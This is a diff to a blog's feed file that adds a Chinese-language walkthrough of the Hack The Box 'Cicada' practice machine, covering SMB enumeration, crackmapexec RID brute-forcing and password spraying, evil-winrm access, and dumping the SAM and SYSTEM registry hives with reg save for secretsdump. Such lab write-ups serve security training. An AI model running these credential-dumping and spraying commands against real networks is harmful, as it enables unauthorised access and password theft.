@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>HTB-Cicada</title>
+    <link href="/2025/01/17/HTB-Cicada/"/>
+    <url>/2025/01/17/HTB-Cicada/</url>
+    
+    <content type="html"><![CDATA[<h1 id="HTB-Cicada"><a href="#HTB-Cicada" class="headerlink" title="HTB-Cicada"></a>HTB-Cicada</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501172224341.png" alt="image-20250117222429112"></p><p>端口开放 445 利用smbclient查看一下共享资源。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501172233795.png" alt="image-20250117223333678"></p><p>在HR下 找到一个txt文件 下载下来。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221443990.png" alt="image-20250122144303840"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在txt里面得到一个账户默认的密码，但是用户名并不知道，需要枚举。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crackmapexec</span> smb <span class="hljs-number">10.10.11.35</span> -u  <span class="hljs-string">&quot;guest&quot;</span> -p  <span class="hljs-string">&quot; &quot;</span> --rid-brute | grep <span class="hljs-string">&quot;SidTypeUser&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221524468.png" alt="image-20250122152403374"></p><p>用这些用户名当作一个字典 。</p><p>然后用前面获取到的密码 进行一个爆破。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221533284.png" alt="image-20250122153329202"></p><p>得到用户名：michael.wrightson</p><p>上面通过smbclient得到的用户权限只能访问HR的 但是DEV的没权限访问 需要账户密码 我们新获取的账户密码同样没有权限访问DEV</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221557155.png" alt="image-20250122155726069"></p><p>通过–users 枚举其他用户</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221602227.png" alt="image-20250122160252015"></p><p>得到另外一个账户david.orelious的密码 。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221605307.png" alt="image-20250122160551175"></p><p>发现有权限了，然后就是smbclient登录进去 查看信息。</p><p>存在一个powershell脚本文件 下载下来看看。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221608107.png" alt="image-20250122160809969"></p><p>里面存在账户名和密码 evil-winrm登录一下看看,成功登录。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221619533.png" alt="image-20250122161915462"></p><p>能够利用SetBackup进行提权。</p><p>首先将sam和system的hash备份一下 然后利用evil-winrm将备份文件下载下来</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save hklm\system <span class="hljs-name">C</span>:\Users\emily.oscars.CICADA\Documents\system.hive<br><br>reg save hklm\sam <span class="hljs-name">C</span>:\Users\emily.oscars.CICADA\Documents\sam.hive<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221639022.png" alt="image-20250122163859902"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">download C:\Users\emily<span class="hljs-selector-class">.oscars</span>.CICADA\Documents\system<span class="hljs-selector-class">.hive</span> /root/system<span class="hljs-selector-class">.hive</span><br><br>download C:\Users\emily<span class="hljs-selector-class">.oscars</span>.CICADA\Documents\sam<span class="hljs-selector-class">.hive</span> /root/sam.hive<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221701613.png" alt="image-20250122170142452"></p><p>下载完成之后 通过secretsdump.py 最终能获取到Administrator的NTLM哈希 然后再次通过evil-winrm登录。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Windows靶机初级</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>HTB</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ctfshow渗透赛复现</title>
     <link href="/2025/01/10/ctfshow_%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/"/>
     <url>/2025/01/10/ctfshow_%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/</url>
